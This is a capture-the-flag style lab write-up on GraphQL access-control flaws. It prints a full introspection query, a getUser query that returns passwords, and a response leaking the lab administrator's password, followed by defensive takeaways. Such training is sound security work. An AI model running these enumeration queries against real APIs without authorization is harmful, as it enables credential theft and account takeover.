# Accidental Exposure of Private GraphQL Fields

## Description

This lab demonstrates how sensitive GraphQL fields can be exposed due to insufficient access control. By performing schema introspection, hidden queries and fields can be discovered. The `getUser` query exposes user credentials, allowing an attacker to enumerate users and retrieve the administrator's password.

---

## Steps

1. Log in with the provided user credentials (`wiener:peter`).

2. Capture the GraphQL login request in Burp Suite.

3. Send the request to **Repeater** and replace it with the standard GraphQL introspection query.

```graphql
query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
  }
}

fragment FullType on __Type {
  kind
  name
  fields(includeDeprecated: true) {
    name
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
  }
}

fragment InputValue on __InputValue {
  name
  type {
    ...TypeRef
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
    }
  }
}
```

4. Review the introspection response and identify the `getUser` query.

5. Query the `getUser` endpoint.

```graphql
query($id: Int!) {
    getUser(id: $id) {
        id
        username
        password
    }
}
```

Variables:

```json
{
    "id": 1
}
```

6. The response reveals the administrator's credentials.

```json
{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "d60myc8krf0jgfv5uw67"
    }
  }
}
```

7. Log in using the leaked administrator credentials.

---

## Key Takeaways

- GraphQL introspection can reveal hidden queries and object types.
- Sensitive fields such as passwords should never be exposed through GraphQL APIs.
- Authorization must be enforced on every GraphQL resolver.
- Introspection should be disabled or restricted in production environments whenever possible.
